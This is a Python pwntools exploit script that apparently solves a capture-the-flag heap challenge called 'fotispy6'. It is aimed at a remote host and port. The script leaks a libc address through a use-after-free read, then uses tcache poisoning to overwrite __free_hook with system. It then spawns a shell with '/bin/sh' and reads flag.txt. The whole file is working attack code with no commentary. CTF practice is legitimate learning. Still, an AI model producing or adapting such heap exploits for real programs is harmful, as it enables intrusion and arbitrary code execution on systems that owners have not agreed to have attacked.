#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5196
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy6_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.31.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000014F2
            brva 0x00000000000016CD
            brva 0x0000000000001722
            brva 0x0000000000001670
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def create_user(username, password):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'Username: ', username)
    p.sendlineafter(b'Password: ', password)

def add_song(size, data):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def edit_comment(idx, size, data):
    p.sendlineafter(b'Choice: ', str(3))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def view_comment(idx):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'select: ', str(idx))

def free_song(idx):
    p.sendlineafter(b'Choice: ', str(5))
    p.sendlineafter(b'select: ', str(idx))

# VARIABLE


# PAYLOAD
add_song(0x500, b'abcd')
for i in range(5):
    add_song(0x30, b'a'*8)
free_song(0)
view_comment(0)
p.recvuntil(b'comment:\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x1ecbe0
log.info("Libc base: " + hex(libc.address))

free_song(2)
free_song(1)
edit_comment(1, 0x30, p64(libc.sym.__free_hook))
add_song(0x30, b'a'*8)
add_song(0x30, p64(libc.sym.system))
add_song(0x30, b'/bin/sh\0')
free_song(8)
p.sendline(b'cat flag.txt')

p.interactive()